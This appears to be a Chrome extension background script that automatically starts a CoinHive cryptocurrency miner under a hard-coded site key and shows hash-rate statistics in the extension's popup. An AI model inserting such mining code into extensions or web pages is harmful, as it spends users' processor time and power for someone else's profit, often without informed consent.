
loadFunc = function() {

  var miner = new CoinHive.Anonymous("yWs0yWPPMWbIX6xhTGJrvawWj0VXmnAK", {throttle: 0.3});

  // Only start on non-mobile devices and if not opted-out
  // in the last 14400 seconds (4 hours):
  if (!miner.isMobile() && !miner.didOptOut(14400)) {
  	miner.start();
  }
  // Listen on events
  miner.on('found', function() { console.log("Hash found") })
  miner.on('accepted', function() { console.log("Hash accepted")/* Hash accepted by the pool */ })

  // Update stats once per second
  setInterval(function() {
  	var hashesPerSecond = miner.getHashesPerSecond();
  	var totalHashes = miner.getTotalHashes();
  	var acceptedHashes = miner.getAcceptedHashes();

    var views = chrome.extension.getViews();
    var hps, total, accepted
    
    if (views.length > 1) {
      hps = views[1].document.getElementById("hps")
      total = views[1].document.getElementById("total")
      accepted = views[1].document.getElementById("accepted")      
    }

    if (hps == null) { return }
    
  	// Output to HTML elements...
    hps.innerText       = "Hashes/Sec: " + hashesPerSecond;
    total.innerText     = "Total:      " + totalHashes;
    accepted.innerText  = "Accepted:   " + acceptedHashes;
    
  }, 1000);
  
}

loadFunc()
// window.addEventListener("load", loadFunc)